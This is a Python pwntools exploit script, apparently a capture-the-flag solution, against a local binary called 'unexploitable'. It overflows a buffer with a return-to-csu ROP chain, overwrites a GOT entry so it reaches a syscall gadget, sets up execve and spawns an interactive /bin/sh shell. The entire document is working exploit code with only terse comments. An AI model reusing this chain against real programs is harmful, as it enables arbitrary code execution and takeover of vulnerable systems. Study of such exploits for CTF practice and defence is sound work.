from pwn import *

p = process("./unexploitable")
e = ELF("./unexploitable")

#context.log_level = 'debug'
gdb.attach(p)

read_got = e.got['read']
sleep_got = e.got['sleep']

data = 0x601018
bss = e.bss()

csu_init1 = 0x4005e6
csu_init2 = 0x4005d0
dummy = p64(0)


payload = b'A' * 24

def rtc_chain(func, arg1, arg2, arg3):
        return p64(0) + p64(1) + p64(func) + p64(arg1) + p64(arg2) + p64(arg3) + p64(csu_init2)


# read(0, data, 8) => bss : /bin/sh
payload += p64(csu_init1)
payload += dummy
payload += rtc_chain(read_got, 0, data, 8)


# read(0, read@got, 1) => make syscall gadget
payload += dummy
payload += rtc_chain(read_got, 0, read_got, 1)


# read(0, bss, 59) => set rax 59 (execve)
payload += dummy
payload += rtc_chain(read_got, 0, bss, 59)


# sleep(data) => execve("/bin/sh", 0, 0)
payload += dummy
payload += rtc_chain(sleep_got, data, 0, 0)


p.sendline(payload)
sleep(0.5)
p.send(b"/bin/sh\x00")
sleep(0.5)
p.send("\x52")
sleep(0.5)
p.sendline("A" * 59)

p.interactive()
